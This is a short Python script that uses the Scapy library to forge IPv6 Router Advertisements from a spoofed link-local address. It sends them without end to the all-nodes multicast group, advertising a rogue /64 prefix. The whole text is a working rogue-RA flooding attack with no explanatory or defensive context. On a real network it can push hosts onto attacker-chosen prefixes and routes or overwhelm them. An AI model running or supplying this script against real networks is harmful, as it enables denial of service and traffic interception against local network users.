from scapy import *
a=IPv6(src='fe80::a:b:c:d', dst='ff02::1')
b=ICMPv6ND_RA() 
c=ICMPv6NDOptPrefixInfo(prefixlen=64,prefix='2001:db8:bad:cafe::') 
pkt = a/b/c
while True:
	send(pkt)